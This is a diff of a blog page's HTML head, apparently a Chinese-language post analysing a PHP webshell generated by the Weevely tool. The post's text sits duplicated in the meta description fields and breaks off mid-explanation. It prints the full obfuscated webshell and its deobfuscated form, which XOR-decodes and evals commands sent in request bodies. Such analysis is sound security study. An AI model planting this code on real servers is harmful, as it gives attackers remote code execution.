@@ -9,7 +9,172 @@
         let theme = localStorage.getItem("meek_theme") || "light";
         document.documentElement.setAttribute("data-color-mode", theme);
     </script>
-<meta name="description" content="Weevely Wish">
+<meta name="description" content="
+Last Edited: March 25, 2024 7:28 PM
+
+# Weevely
+
+通过weevely生成php
+
+```php
+<?php
+$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8';
+$v='input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';
+$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}';
+$d=str_replace('D','','cDrDeDaDDte_fuDnction');
+$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i<$l;8i){fo8ir($8ij=0;($j<$c&&$i8i<$l);8i$j+8i+,$i+8i+';
+$Y='$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i';
+$A=str_replace('8i','',$Y.$k.$u.$v.$h);
+$b=$d('',$A);$b();
+?>
+
+```
+
+进行一点分析
+
+```php
+<?php
+//第一部分：
+$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8';
+$v='input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';
+$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}';
+$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i<$l;8i){fo8ir($8ij=0;($j<$c&&$i8i<$l);8i$j+8i+,$i+8i+';
+$Y='$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i';
+$A=str_replace('8i','',$Y.$k.$u.$v.$h);
+
+//第二部分
+$d=str_replace('D','','cDrDeDaDDte_fuDnction');
+$b=$d('',$A);
+$b();
+?>
+
+```
+
+# First Part
+
+首先，第一部分的进行替换字符之后，得到
+
+```php
+$k="8c319f28";
+$kh="d81d1527a942";
+$kf="8e9a5c2195f5";
+$p="ZnCtZbYsDzbbdvRw";
+
+function x($t, $k) {
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = "";
+
+    for ($i = 0; $i < $l;) {
+        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
+            $o .= $t{$i} ^ $k{$j};
+        }
+    }
+
+    return $o;
+}
+
+if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
+	@ob_start();
+	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+	$o=@ob_get_contents();//获取当前缓冲区的内容，并返回缓冲区的数据
+	@ob_end_clean();//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区
+	$r=@base64_encode(@x(@gzcompress($o),$k));
+	print("$p$kh$r$kf");}
+```
+
+从if语句的部分开始拆分
+
+## *@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)*
+
+**"/$kh(.+)$kf/"**
+
+- `()`标记一个子表达式的开始和结束位置。">
+<meta property="og:title" content="Weevely Wish">
+<meta property="og:description" content="
+Last Edited: March 25, 2024 7:28 PM
+
+# Weevely
+
+通过weevely生成php
+
+```php
+<?php
+$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8';
+$v='input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';
+$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}';
+$d=str_replace('D','','cDrDeDaDDte_fuDnction');
+$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i<$l;8i){fo8ir($8ij=0;($j<$c&&$i8i<$l);8i$j+8i+,$i+8i+';
+$Y='$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i';
+$A=str_replace('8i','',$Y.$k.$u.$v.$h);
+$b=$d('',$A);$b();
+?>
+
+```
+
+进行一点分析
+
+```php
+<?php
+//第一部分：
+$u='){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8';
+$v='input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge';
+$h='t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}';
+$k='$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i<$l;8i){fo8ir($8ij=0;($j<$c&&$i8i<$l);8i$j+8i+,$i+8i+';
+$Y='$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i';
+$A=str_replace('8i','',$Y.$k.$u.$v.$h);
+
+//第二部分
+$d=str_replace('D','','cDrDeDaDDte_fuDnction');
+$b=$d('',$A);
+$b();
+?>
+
+```
+
+# First Part
+
+首先，第一部分的进行替换字符之后，得到
+
+```php
+$k="8c319f28";
+$kh="d81d1527a942";
+$kf="8e9a5c2195f5";
+$p="ZnCtZbYsDzbbdvRw";
+
+function x($t, $k) {
+    $c = strlen($k);
+    $l = strlen($t);
+    $o = "";
+
+    for ($i = 0; $i < $l;) {
+        for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
+            $o .= $t{$i} ^ $k{$j};
+        }
+    }
+
+    return $o;
+}
+
+if(@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)==1) {
+	@ob_start();
+	@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+	$o=@ob_get_contents();//获取当前缓冲区的内容，并返回缓冲区的数据
+	@ob_end_clean();//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区
+	$r=@base64_encode(@x(@gzcompress($o),$k));
+	print("$p$kh$r$kf");}
+```
+
+从if语句的部分开始拆分
+
+## *@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)*
+
+**"/$kh(.+)$kf/"**
+
+- `()`标记一个子表达式的开始和结束位置。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://66lueflam144.github.io/realOne81/post/Weevely%20Wish.html">
+<meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/3468/3468341.png">
 <title>Weevely Wish</title>
 <link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
 
